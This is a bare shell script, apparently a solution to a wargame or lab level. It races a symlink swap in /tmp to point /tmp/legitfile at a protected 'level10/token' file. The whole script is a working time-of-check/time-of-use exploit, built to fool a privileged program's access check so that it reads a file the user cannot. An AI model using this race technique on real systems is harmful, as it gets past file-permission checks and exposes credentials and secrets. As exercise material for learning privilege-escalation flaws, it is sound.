#!/bin/sh

while true; do
	if [ -e "/tmp/legitfile" ]; then
		rm -f "/tmp/legitfile"
	fi
	touch /tmp/legitfile
	chmod 755 /tmp/legitfile

	sleep 0.001

	ln -sfv /home/user/level10/token /tmp/legitfile
done